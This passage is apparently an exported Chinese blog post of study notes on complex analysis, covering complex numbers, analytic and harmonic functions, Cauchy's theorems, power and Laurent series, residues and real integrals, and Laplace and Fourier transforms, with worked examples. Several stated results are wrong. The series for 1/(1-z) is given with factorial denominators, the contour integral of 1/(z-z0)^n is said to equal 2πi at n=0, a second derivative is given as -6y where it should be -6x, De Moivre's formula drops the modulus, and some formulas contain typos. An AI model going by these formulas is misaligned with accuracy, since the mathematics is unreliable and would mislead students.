$$<br>\\begin{aligned}<br>F(s)<br>&amp;=\\mathscr{L}[f(t)]\\\\<br>&amp;=\\int_{0}^{\\infty}e^{kt}e^{-st}\\mathrm{d}t\\\\<br>&amp;=\\frac{1}{s-k} \\quad, \\mathrm{Re}(s)&gt;k<br>\\end{aligned}$$</p>\n<p>类似地， $f(t)=\\cos kt$ 的 Laplace 变换为 $F(s)=\\frac{s}{s^2+k^2}$ ， $f(t)=\\sin kt$ 的 Laplace 变换为 $F(s)=\\frac{k}{s^2+k^2}$ 。</p>\n<h3 id=\"Laplace-变换的性质\"><a href=\"#Laplace-变换的性质\" class=\"headerlink\" title=\"Laplace 变换的性质\"></a>Laplace 变换的性质</h3><p>$$<br>\\mathscr{L}[f’(t)]=sF(s)-f(0) \\\\<br>$$<br>更一般地，有<br>$$<br>\\mathscr{L}[f^{(n)}(t)]=s^nF(s) - s^{n-1}f(0) - s^{n-2}f’(0) - \\cdots - f^{(n-1)}(0)<br>$$</p>\n<h3 id=\"Laplace-逆变换\"><a href=\"#Laplace-逆变换\" class=\"headerlink\" title=\"Laplace 逆变换\"></a>Laplace 逆变换</h3><p><strong>例</strong> 求 $F(s)=\\frac{1}{s^2(s+1)}$ 的 Laplace 逆变换。<br><strong>解</strong> 函数 $F(s)$满足条件 $\\lim\\limits_{s \\to 0}F(s)=0$ ，且 $s=0$ 是 $F(s)$ 的二级极点， $s=-1$是 $F(s)$的一级极点，故<br>$$<br>\\begin{aligned}<br>f(t) = \\mathscr{L}^{-1}[F(s)]<br>&amp;= \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},0\\right] + \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},-1\\right] \\\\<br>&amp;= (t-1) + e^{-t},\\quad t &gt; 0<br>\\end{aligned}<br>$$</p>\n<h3 id=\"卷积\"><a href=\"#卷积\" class=\"headerlink\" title=\"卷积\"></a>卷积</h3><h3 id=\"Laplace-变换的应用\"><a href=\"#Laplace-变换的应用\" class=\"headerlink\" title=\"Laplace 变换的应用\"></a>Laplace 变换的应用</h3><p><strong>例</strong> 求解微分方程 $y’’+\\omega^2y(t)=0, y(0)=0, y’(0)=\\omega$ 。</p>\n<p><strong>解</strong> 令 $Y(s)=\\mathscr{L}[y(t)]$ ，对方程两边取 Laplace 变换，得<br>$$<br>s^2Y(s)-sy(0)-y’(0)+\\omega^2Y(s)=0<br>$$<br>代入初值条件，得<br>$$<br>s^2Y(s)-\\omega+\\omega^2Y(s)=0 \\\\<br>\\Rightarrow Y(s)=\\frac{\\omega}{s^2+\\omega^2}<br>$$<br>求逆变换，得<br>$$<br>\\begin{aligned}<br>y(t)=\\mathscr{L}^{-1}\\left[\\frac{\\omega}{s^2+\\omega^2}\\right] &amp;= \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},w\\mathrm{i}\\right] + \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},-w\\mathrm{i}\\right] \\\\<br>&amp;= \\lim_{s\\to w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} + \\lim_{s\\to -w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} \\\\<br>&amp;=\\frac{we^w\\mathrm{i}t}{2w\\mathrm{i}}+\\frac{we^{-w\\mathrm{i}t}}{-2w\\mathrm{i}} \\\\<br>&amp;=\\frac{2\\mathrm{i}\\sin wt}{2\\mathrm{i}}=\\sin wt<br>\\end{aligned}<br>$$</p>\n","excerpt":"<p>高数写了笔记再考试效果挺好的 <del>（为什么挂科之前没这觉悟啊）</del>，复变也记一下吧。</p>","more":"<h2 id=\"复数与复变函数\"><a href=\"#复数与复变函数\" class=\"headerlink\" title=\"复数与复变函数\"></a>复数与复变函数</h2><h3 id=\"复数及其运算\"><a href=\"#复数及其运算\" class=\"headerlink\" title=\"复数及其运算\"></a>复数及其运算</h3><p>通常记复数为 $z=x+\\mathrm{i}y$ ，其中实部与虚部记作<br>$$<br>x=\\mathrm{Re}(z),\\quad y=\\mathrm{Im}(z)<br>$$<br>显然<br>$$<br>\\mathrm{Re}(z)=\\frac{z+\\overline{z}}{2},\\quad \\mathrm{Im}(z)=\\frac{z-\\overline{z}}{2\\mathrm{i}}<br>$$<br>以正实轴为始边，以 $z(z\\neq 0)$ 所对应的向量为终边的角称为复数 $z$ 的辐角，记作 $\\mathrm{Arg}\\ z$ ，把在 $(-\\pi,\\pi]$ 之间的辐角称为 $z$ 的主辐角（或主值或者叫辐角主值），记作 $\\mathrm{arg}\\ z$ 。<br>有个重要点就是辐角要<strong>注意正负</strong>。</p>\n<p>以及大名鼎鼎的<strong>欧拉公式</strong>：$$e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$$</p>\n<p>一个没什么名但是<strong>很有用</strong>的公式——棣莫弗公式：$$z^n = \\cos n\\theta + \\mathrm{i}\\sin n\\theta$$</p>\n<p><strong>复数的开方</strong><br>复数开方时，开几次方就有几个结果。<br>求 $w=\\sqrt[n]{z}$ 时，令 $w=\\rho e^{\\mathrm{i}\\varphi}$ ，从而 $\\rho^n e^{\\mathrm{i}n\\varphi} = z = re^{\\mathrm{i}\\theta}$ ，得到<br>$$<br>\\rho^n = r,\\quad n\\varphi = \\theta + 2k\\pi,\\quad k=0,\\pm1,\\pm2,\\cdots<br>$$故<br>$$<br>\\rho = r^{1/n},\\quad \\varphi = \\frac{\\theta + 2k\\pi}{n}<br>$$于是<br>$$<br>w = \\sqrt[n]{r}e^{\\mathrm{i}\\frac{\\theta + 2k\\pi}{n}}<br>$$</p>\n<h3 id=\"平面点集的一般概念\"><a href=\"#平面点集的一般概念\" class=\"headerlink\" title=\"平面点集的一般概念\"></a>平面点集的一般概念</h3><p>和高数类似，没啥好说的。</p>\n<h3 id=\"复变函数\"><a href=\"#复变函数\" class=\"headerlink\" title=\"复变函数\"></a>复变函数</h3><p>似乎也没啥重要的（）</p>\n<h2 id=\"解析函数\"><a href=\"#解析函数\" class=\"headerlink\" title=\"解析函数\"></a>解析函数</h2><h3 id=\"解析函数的概念与柯西-黎曼方程\"><a href=\"#解析函数的概念与柯西-黎曼方程\" class=\"headerlink\" title=\"解析函数的概念与柯西-黎曼方程\"></a>解析函数的概念与柯西-黎曼方程</h3><p><strong>奇点</strong>：如果函数 $f(z)$ 在点 $z_0$ <strong>不解析</strong>，则称 $z_0$ 为 $f(z)$ 的奇点。<br>求<strong>有理分式</strong>的奇点时，直接取<strong>分母零点</strong>即可。</p>\n<p>柯西-黎曼方程（C-R方程）：<br>$$<br>\\frac{\\partial u}{\\partial x} = \\frac{\\partial v}{\\partial y},\\quad \\frac{\\partial u}{\\partial y} = -\\frac{\\partial v}{\\partial x}<br>$$</p>\n<p>可导的充要条件： $u(x,y)$ 和 $v(x,y)$ 在点 $x,y$ 可微，且在该点满足C-R方程。</p>\n<p><strong>例</strong> 证明：柯西-黎曼方程的极坐标形式是<br>$$<br>\\frac{\\partial u}{\\partial r} = \\frac{1}{r}\\frac{\\partial v}{\\partial \\theta},\\quad \\frac{\\partial v}{\\partial r} = -\\frac{1}{r}\\frac{\\partial r}{\\partial \\theta}<br>$$</p>\n<h3 id=\"初等函数及其解析性\"><a href=\"#初等函数及其解析性\" class=\"headerlink\" title=\"初等函数及其解析性\"></a>初等函数及其解析性</h3><p><strong>指数函数</strong> $z=x+\\mathrm{i}y$ 为任意复数，称 $w=e^z=e^x(\\cos y+\\mathrm{i}\\sin y)$ 为指数函数。</p>\n<p><strong>对数函数</strong> 满足方程 $e^w = z$ 的函数 $w=\\mathrm{Ln} \\ z$ 称为对数函数，且<br>$$<br>\\mathrm{Ln}\\ z = \\ln z + 2k\\pi\\mathrm{i} = \\ln|z| + \\mathrm{i}\\mathrm{arg}\\ z + 2k\\pi\\mathrm{i},\\quad k=0,\\pm1,\\pm2,\\cdots<br>$$</p>\n<p><strong>幂函数</strong> $w=z^a=e^{a\\mathrm{Ln}\\ z}$ 为幂函数。</p>\n<p><strong>三角函数</strong> 称 $\\sin z = \\frac{e^{\\mathrm{i}z}-e^{-\\mathrm{i}z}}{2\\mathrm{i}}$ 为正弦函数， $\\cos z = \\frac{e^{\\mathrm{i}z}+e^{-\\mathrm{i}z}}{2}$ 为余弦函数。</p>\n<p><strong>双曲函数</strong> 称 $\\sinh z = \\frac{e^z-e^{-z}}{2}$ 为双曲正弦函数， $\\cosh z = \\frac{e^z+e^{-z}}{2}$ 为双曲余弦函数。</p>\n<h3 id=\"解析函数与调和函数的关系\"><a href=\"#解析函数与调和函数的关系\" class=\"headerlink\" title=\"解析函数与调和函数的关系\"></a>解析函数与调和函数的关系</h3><p>若实二元函数 $\\varphi(x,y)$ 在区域 $D$ 内具有二阶连续偏导数，且满足 $\\mathrm{Laplace}$ 方程<br>$$<br>\\frac{\\partial^2\\varphi}{\\partial x^2} + \\frac{\\partial^2\\varphi}{\\partial y^2} = 0<br>$$<br>则称 $\\varphi(x,y)$ 为区域 $D$ 的调和函数。</p>\n<p><strong>例</strong> 验证 $u(x,y)=x^3-3xy^2$ 为调和函数，并求以 $u(x,y)$ 为实部的解析函数 $f(z)$ ，使得 $f(\\mathrm{i}) = -\\mathrm{i}$ 。</p>\n<p><strong>解</strong> $u_{xx}=6x$，$u_{yy}=-6y$，故 $u_{xx}+u_{yy}=0$， $u(x,y)$ 为调和函数。下面求虚部 $v(x,y)$ 。<br><strong>法一</strong>：偏积分法<br>$$<br>u_x = 3x^2-3y^2 = v_y \\Rightarrow v = \\int (3x^2-3y^2)\\mathrm{d}y = 3x^2y-y^3 + \\varphi(x) \\\\<br>v_x = 6xy+\\varphi’(x) = -u_y = 6xy \\Rightarrow \\varphi(x) = C \\Rightarrow v(x,y) = 3x^2y - y^3 + C<br>$$</p>\n<p><strong>法二</strong>：全微分法<br>$$<br>v_y=u_x=3x^2-3y^2,v_x=-u_y=6xy\\\\<br>\\Rightarrow \\mathrm{d}v = v_x’\\mathrm{d}x +v_y’\\mathrm{d}y=6xy\\mathrm{d}x + (3x^2-3y^2)\\mathrm{d}y\\\\<br>\\Rightarrow v(x,y)=\\int_{(0,0)}^{(x,y)}6xy\\mathrm{d}x+(3x^2-3y^2)\\mathrm{d}y + C \\\\<br>=\\int_0^x\\mathrm{d}x+\\int_0^y(3x^2-3y^2)\\mathrm{d}y + C = 3x^2y - y^3 + C<br>$$</p>\n<p>最后代入 $f(\\mathrm{i})=-\\mathrm{i}$ 有 $f(z)=(x^3-3xy^2)+\\mathrm{i}(3x^2y-y^3)=z^3$ 。</p>\n<h2 id=\"复变函数的积分\"><a href=\"#复变函数的积分\" class=\"headerlink\" title=\"复变函数的积分\"></a>复变函数的积分</h2><h3 id=\"复变函数积分的概念\"><a href=\"#复变函数积分的概念\" class=\"headerlink\" title=\"复变函数积分的概念\"></a>复变函数积分的概念</h3><p><strong>例</strong> 计算 $I=\\oint_{\\mathit{\\Gamma}}\\frac{1}{(z-z_0)^n}\\mathrm{d}z$ ，其中 $\\mathit{\\Gamma}$ 为包含 $z_0$ 的一条闭曲线。<br><strong>解</strong> 以 $z_0$ 为圆心 $r$ 为半径作圆，则函数 $f(z)=\\frac{1}{(z-z_0)^n}$ 在 $\\overline{D}=D+\\mathit{\\Gamma}+C^-$上解析，因此<br>$$<br>I = \\oint_C\\frac{\\mathrm{d}z}{(z-z_0)^n}\\mathrm{d}z<br>= \\begin{cases}<br>2\\pi\\mathrm{i}, &amp; n = 0 \\\\<br>0, &amp; n\\neq0<br>\\end{cases}<br>$$</p>\n<h3 id=\"柯西积分定理\"><a href=\"#柯西积分定理\" class=\"headerlink\" title=\"柯西积分定理\"></a>柯西积分定理</h3><p>设函数 $f(z)$ 在单连通域 $D$ 内解析， $\\mathit{\\Gamma}$ 为 $D$ 内的任意一条简单闭曲线，则有$$\\oint_{\\mathit{\\Gamma}}f(z)\\mathrm{d}z=0$$<br>甚至也不用在$ \\mathit{\\Gamma}$ 上解析，在 $\\mathit{\\Gamma}$ 上连续就成立。</p>\n<h3 id=\"复合闭路定理\"><a href=\"#复合闭路定理\" class=\"headerlink\" title=\"复合闭路定理\"></a>复合闭路定理</h3><p>设多连域 $D$ 的边界为 $C=C_0 + C_1^- + C_2^- + \\cdots + C_n^-$ ，函数 $f(z)$ 在 $D$ 内解析，在 $C$ 上连续，则<br>$$<br>\\oint_Cf(z)\\mathrm{d}z = 0<br>$$<br>或<br>$$<br>\\oint_{C_0}f(z)\\mathrm{d}z = \\sum_{k=1}^n\\oint_{C_k}f(z)\\mathrm{d}z<br>$$</p>\n<h3 id=\"柯西积分公式\"><a href=\"#柯西积分公式\" class=\"headerlink\" title=\"柯西积分公式\"></a>柯西积分公式</h3><p><strong>柯西积分公式</strong> 若函数 $f(z)$ 在简单正向闭曲线 $C$ 所围成的区域 $D$ 内解析，在区域 $D$ 的边界 $C$ 上连续， $z_0$ 是区域 $D$ 内任意一点，则<br>$$<br>f(z_0) = \\frac{1}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{z-z_0}\\mathrm{d}z<br>$$</p>\n<p><strong>高阶求导公式</strong> 设 $f(z)$ 在 $D$ 内解析，在 $D$ 的边界 $C$ 上连续， $C$ 为正向简单闭曲线，则 $f^{(n)}(z)$ 在 $D$ 内解析，且有<br>$$<br>f^{(n)}(z_0)=\\frac{n!}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{(z-z_0)^{n+1}}\\mathrm{d}z, \\quad \\forall z_0\\in D, n=0,1,2,\\cdots<br>$$</p>\n<h2 id=\"解析函数的幂级数表示\"><a href=\"#解析函数的幂级数表示\" class=\"headerlink\" title=\"解析函数的幂级数表示\"></a>解析函数的幂级数表示</h2><h3 id=\"复级数的基本概念\"><a href=\"#复级数的基本概念\" class=\"headerlink\" title=\"复级数的基本概念\"></a>复级数的基本概念</h3><p>复数列收敛和一般的数列收敛定义类似，其充要条件为<br>$$<br>\\lim_{n\\to\\infty}a_n=a,\\quad \\lim_{n\\to\\infty}b_n=b<br>$$<br>所以判断级数收不收敛就<strong>拆成实部和虚部</strong>然后进行判断。</p>\n<h3 id=\"幂级数\"><a href=\"#幂级数\" class=\"headerlink\" title=\"幂级数\"></a>幂级数</h3><p><strong>收敛半径</strong> 求法与高数类似，但多个根值法：<br>（1）（比值法） $\\lim\\limits_{n\\to\\infty}\\left|\\frac{a_{n+1}}{a_n}\\right|=L$<br>（2）（根值法） $\\lim\\limits_{n\\to\\infty}\\sqrt[n]{|a_n|}=L$<br>则收敛半径 $R=\\frac{1}{L}$</p>\n<p>幂级数性质与高数也类似，可以逐项求导和逐项求积。</p>\n<h3 id=\"解析函数的泰勒展开\"><a href=\"#解析函数的泰勒展开\" class=\"headerlink\" title=\"解析函数的泰勒展开\"></a>解析函数的泰勒展开</h3><p>与高数类似，不再赘述。</p>\n<p><strong>四个重要的已知展开</strong><br>$$<br>\\frac{1}{1-z} = \\sum_{n=0}^\\infty z^n = 1+z+\\frac{z^2}{2}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; 1 \\\\<br>e^z = \\sum_{n=0}^\\infty \\frac{z^n}{n!} = 1+z+\\frac{z^2}{2!}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\<br>\\sin z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n+1}}{(2n+1)!} = z-\\frac{z^3}{3!}+\\frac{z^5}{5!}-\\frac{z^7}{7!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\<br>\\cos z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n}}{(2n)!} = 1-\\frac{z^2}{2!}+\\frac{z^4}{4!}-\\frac{z^6}{6!}+\\cdots,\\enspace |z| &lt; +\\infty<br>$$</p>\n<p><strong>展开后注意标出收敛圆！</strong></p>\n<h3 id=\"洛朗级数\"><a href=\"#洛朗级数\" class=\"headerlink\" title=\"洛朗级数\"></a>洛朗级数</h3><p>泰勒展开有个缺陷，那就是只能展开到解析的地方，如果中间有个奇点卡住，那就不能再往外展开了。<br>这个时候就用到洛朗级数，可以在圆环域展开，弥补泰勒展开的不足。</p>\n<h2 id=\"留数及其应用\"><a href=\"#留数及其应用\" class=\"headerlink\" title=\"留数及其应用\"></a>留数及其应用</h2><h3 id=\"孤立奇点\"><a href=\"#孤立奇点\" class=\"headerlink\" title=\"孤立奇点\"></a>孤立奇点</h3><h4 id=\"零点的判断\"><a href=\"#零点的判断\" class=\"headerlink\" title=\"零点的判断\"></a>零点的判断</h4><p>首先很直白的， $f(z_0)=0$ ，那么 $z=z_0$ 就是 $f(z)$ 的零点。<br>若 $f(z)=(z-z_0)^m\\varphi(z)$ ， $\\varphi(z)$ 在 $z_0$ 处解析且 $\\varphi(z_0)\\neq 0$ ，则 $z=z_0$ 是 $f(z)$ 的 $m$ 阶零点。</p>\n<h4 id=\"奇点类型的判断\"><a href=\"#奇点类型的判断\" class=\"headerlink\" title=\"奇点类型的判断\"></a>奇点类型的判断</h4><p>从定义上判断的话就先展开成洛朗级数，即设 $z_0$ 为 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $0 &lt; |z-Z_0| &lt; \\delta$ 内洛朗展开为 $f(z)=\\sum\\limits_{n=0}^{+\\infty} a_n(z-z_0)^n$ 。</p>\n<ol>\n<li>可去奇点：展开式中不含负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=C$ 。</li>\n<li>$N$ 阶极点：含有限多的负幂次项，且最高负幂次为 $N$ ，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=\\infty$。</li>\n<li>本性奇点：含无穷多的负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)$ 不存在且不为 $\\infty$ 。</li>\n</ol>\n<h3 id=\"留数\"><a href=\"#留数\" class=\"headerlink\" title=\"留数\"></a>留数</h3><h4 id=\"留数的定义\"><a href=\"#留数的定义\" class=\"headerlink\" title=\"留数的定义\"></a>留数的定义</h4><p>设 $z_0$ 为函数 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $z_0$ 的去心邻域内展开成洛朗级数<br>$$<br>f(z) = \\sum_{n=-\\infty}^{+\\infty}a_n(z-z_0)^n = \\cdots + a_{-2}(z-z_0)^{-2} + a_{-1}(z-z_0)^{-1} + a_0 + a_1(z-z_0) + a_2(z-z_0)^2 + \\cdots<br>$$<br>称 $a_{-1}$ 为 $f(z)$ 在 $z_0$ 处的留数，记作$$\\mathrm{Res}[f(z),z_0]=a_{-1}=\\frac{1}{2\\pi i}\\oint\\limits_c f(z)\\mathrm{d}z$$<br>其中 $C$ 是 $z_0$ 的去心邻域内绕 $z_0$ 的一条简单闭曲线。</p>\n<h4 id=\"留数的求解\"><a href=\"#留数的求解\" class=\"headerlink\" title=\"留数的求解\"></a>留数的求解</h4><ol>\n<li>$z_0$ 为可去奇点： $\\mathrm{Res}[f(z),z_0]=0$ 。</li>\n<li>$z_0$ 为本性奇点：需要将$f(z)$在$z_0$的去心邻域内展开成洛朗级数</li>\n<li>$z_0$ 为 $m$ 阶极点：$$\\mathrm{Res}[f(z),z_0]=\\frac{1}{(m-1)!}\\lim_{z\\to z_0}\\frac{d^{m-1}}{dz^{m-1}}[(z-z_0)^mf(z)]$$</li>\n</ol>\n<h4 id=\"无穷远处的留数\"><a href=\"#无穷远处的留数\" class=\"headerlink\" title=\"无穷远处的留数\"></a>无穷远处的留数</h4><p>若函数 $f(z)$ 在无穷远点 $\\infty$ 的去心领域 $R&lt;|f(z)|&lt;+\\infty$ 内解析，则称点 $\\infty$ 为 $f(z)$ 的孤立奇点。</p>\n<p>设函数 $f(z)$ 在圆环域 $R&lt;|z|&lt;+\\infty$ 内解析，则 $f(z)$ 在 $\\infty$ 处的留数为：<br>$$<br>\\mathrm{Res}[f(z),\\infty]=\\frac{1}{2\\pi \\mathrm{i}}\\oint_{C^-}f(z)\\mathrm{d}z<br>$$<br>其中， $C$ 为 $|z|=\\rho &gt; R$ 。</p>\n<p>$$<br>\\mathrm{Res}[f(z), \\infty] = -\\mathrm{Res}[f(\\frac{1}{z})\\cdot\\frac{1}{z^2}, 0]<br>$$</p>\n<h3 id=\"利用留数计算实积分\"><a href=\"#利用留数计算实积分\" class=\"headerlink\" title=\"利用留数计算实积分\"></a>利用留数计算实积分</h3><h4 id=\"形如-int-0-2-pi-R-cos-theta-sin-theta-mathrm-d-theta-的积分\"><a href=\"#形如-int-0-2-pi-R-cos-theta-sin-theta-mathrm-d-theta-的积分\" class=\"headerlink\" title=\"形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分\"></a>形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分</h4><p><strong>计算方法</strong>：</p>\n<ol>\n<li>令 $z=e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$ ，则 $\\mathrm{d}\\theta=\\frac{\\mathrm{d}z}{\\mathrm{i}z}$ ， $\\cos\\theta=\\frac{z^2+1}{2z}$ ， $\\sin\\theta=\\frac{z^2-1}{2\\mathrm{i}z}$ 。</li>\n<li>$\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta=\\oint_{|z|=1}R\\left(\\frac{z^2+1}{2z},\\frac{z^2-1}{2\\mathrm{i}z}\\right)\\frac{1}{\\mathrm{i}z}\\mathrm{d}z=\\oint_{|z|=1}f(z)\\mathrm{d}z=2\\pi\\mathrm{i}\\sum\\limits_k \\mathrm{Res}[f(z),z_k]$ ，其中 $z_k$ 是 $f(z)$ <strong>在 $|z|=1$ 内</strong>的孤立奇点。</li>\n</ol>\n<h4 id=\"形如-int-infty-infty-R-x-mathrm-d-x-的积分\"><a href=\"#形如-int-infty-infty-R-x-mathrm-d-x-的积分\" class=\"headerlink\" title=\"形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分\"></a>形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分</h4><p><strong>要求</strong>：</p>\n<ol>\n<li>$R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无<strong>实零点</strong>。</li>\n<li>分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $2$ 或以上。</li>\n</ol>\n<p><strong>计算方法</strong>： $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k]$ ， 其中 $z_k$ 为 $R(z)$在<strong>上半平面</strong>内的孤立奇点。</p>\n<p><strong>例</strong> 求积分 $I=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x$ .<br><strong>解</strong> 首先显然分母零点均为虚数，且分母次数比分子高 $2$ ，故满足条件。</p>\n<ol>\n<li>令 $$R(z)=\\frac{z^2-z+2}{z^4+10z^2+9}=\\frac{z^2-z+2}{(z^2+1)(z^2+9)}$$<br>则上半平面内有一阶极点 $z_1=\\mathrm{i}$ 和 $z_2=3\\mathrm{i}$ 。</li>\n<li>则<br>$$<br>\\begin{aligned}<br>I&amp;=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x\\\\<br>&amp;=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k] \\\\<br>&amp;=2\\pi\\mathrm{i}\\left(\\mathrm{Res}[R(z),\\mathrm{i}]+\\mathrm{Res}[R(z),3\\mathrm{i}]\\right)\\\\<br>&amp;=2\\pi\\mathrm{i}\\left(-\\frac{1+\\mathrm{i}}{16}+\\frac{3-7\\mathrm{i}}{48}\\right) = \\frac{5\\pi}{12}<br>\\end{aligned}<br>$$</li>\n</ol>\n<h4 id=\"形如-int-infty-infty-R-x-e-mathrm-i-ax-mathrm-d-x-a-gt-0-的积分\"><a href=\"#形如-int-infty-infty-R-x-e-mathrm-i-ax-mathrm-d-x-a-gt-0-的积分\" class=\"headerlink\" title=\"形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a&gt;0)$ 的积分\"></a>形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a&gt;0)$ 的积分</h4><p><strong>要求</strong>：</p>\n<ol>\n<li>$R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无<strong>实零点</strong>。</li>\n<li>分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $1$ 或以上。</li>\n</ol>\n<p><strong>计算方法</strong>： $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z)e^{\\mathrm{i}az},z_k]$ ， 其中 $z_k$ 为 $R(z)$在<strong>上半平面</strong>内的孤立奇点。</p>\n<h2 id=\"Fourier变换\"><a href=\"#Fourier变换\" class=\"headerlink\" title=\"Fourier变换\"></a>Fourier变换</h2><p>记得上一年的这个时候就对傅里叶变换有所接触了，然而时光荏苒，却一直没能有什么更深的理解，有些惭愧了。</p>\n<h3 id=\"Fourier-积分公式\"><a href=\"#Fourier-积分公式\" class=\"headerlink\" title=\"Fourier 积分公式\"></a>Fourier 积分公式</h3><p>$$<br>f(t) = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\left[\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\right]e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega<br>$$<br>这个式子有点奇怪，两边都有 $f(t)$ ，那我要来干嘛呢，这时你先别急，下面拆解一下就有意思了。</p>\n<h3 id=\"Fourier-变换\"><a href=\"#Fourier-变换\" class=\"headerlink\" title=\"Fourier 变换\"></a>Fourier 变换</h3><p>上式中令 $F(\\omega)=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t$ ，则 $f(t)=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}F(\\omega)e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$ ，那么这个关于 $\\omega$ 的函数 $F(\\omega)$ 就是 $f(t)$ 的傅里叶变换。<br>这样一来就可以粗略地理解为傅里叶变换就是把<strong>关于时间的函数</strong>转换为<strong>关于频率的函数</strong>，也就是所谓的时域转换为频域。</p>\n<p><strong>例</strong> 求矩形脉冲函数 $f(t)=\\begin{cases}1, &amp; |t|\\leq a\\\\0, &amp; |t|&gt; a\\end{cases}$ 的傅里叶变换及傅里叶积分表达式。</p>\n<p><strong>解</strong> 经典例题<br>$$<br>\\begin{aligned}<br>F(\\omega)=\\mathscr{F}[f(t)]&amp;=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\<br>&amp;=\\int_{-a}^{a}e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\<br>&amp;=\\frac{1}{-\\mathrm{i}\\omega}\\left(e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}\\right)\\\\<br>&amp;=\\frac{2}{\\omega}\\cdot\\frac{e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}}{-2\\mathrm{i}} \\\\<br>&amp;= \\frac{2}{\\omega}\\cdot\\sin a\\omega<br>\\end{aligned}<br>$$<br>再作傅里叶逆变换，即得傅里叶积分表达式<br>$$<br>\\begin{aligned}<br>f(t)=\\mathscr{F}^{-1}[F(\\omega)]&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\\\\<br>&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega + \\frac{\\mathrm{i}}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\sin\\omega t \\mathrm{d}\\omega\\\\<br>&amp;=\\frac{1}{\\pi}\\int_{-\\infty}^{+\\infty}\\frac{\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega \\\\<br>&amp;=\\begin{cases}1, &amp; |t| &lt; a \\\\ 1/2, &amp; |t| = a \\\\ 0, &amp; |t| &gt; a\\end{cases}<br>\\end{aligned}<br>$$<br>上式中令 $t=0$ ，可得重要积分公式<br>$$<br>\\int_{-\\infty}^{+\\infty}\\frac{\\sin ax}{x} \\mathrm{d}x=\\pi,\\quad (a&gt;0)<br>$$</p>\n<h3 id=\"delta-函数及其-Fourier-变换\"><a href=\"#delta-函数及其-Fourier-变换\" class=\"headerlink\" title=\"$\\delta$ 函数及其 Fourier 变换\"></a>$\\delta$ 函数及其 Fourier 变换</h3><p>我们称满足如下条件的函数为 $\\delta$ 函数：</p>\n<ol>\n<li>当 $t \\neq0$ 时， $\\delta(t)=0$ ；</li>\n<li>$\\int_{-\\infty}^{+\\infty}\\delta(t)\\mathrm{d}t = 1$<br>可以看出，这是一个直观上矛盾的函数。书本上也说明了它不是一个经典意义上的函数，而是一个<strong>广义函数</strong>，有兴趣可以另行搜索。</li>\n</ol>\n<p>$\\delta$ 函数有一个性质，就是对任意的连续函数 $f(t)$ ，都有<br>$$<br>\\int_{-\\infty}^{+\\infty}f(t)\\delta(t)\\mathrm{d}t = f(0)<br>$$更一般地，若 $f(t)$ 在 $t=t_0$ 